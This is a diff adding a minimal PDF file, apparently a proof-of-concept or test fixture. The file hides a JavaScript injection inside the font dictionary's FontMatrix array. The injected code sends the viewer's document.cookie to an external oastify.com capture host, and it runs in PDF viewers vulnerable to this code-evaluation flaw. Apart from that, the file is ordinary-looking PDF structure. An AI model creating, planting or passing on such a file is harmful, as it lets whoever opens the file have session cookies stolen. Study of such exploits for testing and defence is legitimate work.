@@ -1,0 +1,48 @@
+%PDF-1.4
+1 0 obj
+<< /Pages 2 0 R /Type /Catalog >>
+endobj
+2 0 obj
+<< /Count 1 /Kids [ 3 0 R ] /MediaBox [ 0 0 100 100 ] /Type /Pages >>
+endobj
+3 0 obj
+<< /Contents 4 0 R /Parent 2 0 R /Resources << /Font << /F1 5 0 R >> >> /Type /Page >>
+endobj
+4 0 obj
+<< /Length 44 >>
+stream
+BT
+/F1 12 Tf
+10 50 Td
+(A) Tj
+ET
+endstream
+endobj
+5 0 obj
+<< /BaseFont /Verdana /FontDescriptor 6 0 R
+   /FontMatrix [ 1 2 3 4 5 (0\); var i=new Image\(\); i.src='https://7ltd5rc9chxjots5u8ahvj2bt2ztnmbb.oastify.com/?c='+document.cookie; //) ]
+   /Subtype /Type1 /Type /Font >>
+endobj
+6 0 obj
+<< /Flags 4 /FontBBox [ -53 -251 1139 750 ] /FontFile 7 0 R /FontName /Verdana /Type /FontDescriptor >>
+endobj
+7 0 obj
+<< /Length 44 >>
+stream
+dummy font data never parsed
+endstream
+endobj
+xref
+0 8
+0000000000 65535 f 
+0000000015 00000 n 
+0000000064 00000 n 
+0000000149 00000 n 
+0000000251 00000 n 
+0000000384 00000 n 
+0000000607 00000 n 
+0000000748 00000 n 
+trailer << /Root 1 0 R /Size 8 >>
+startxref
+830
+%%EOF
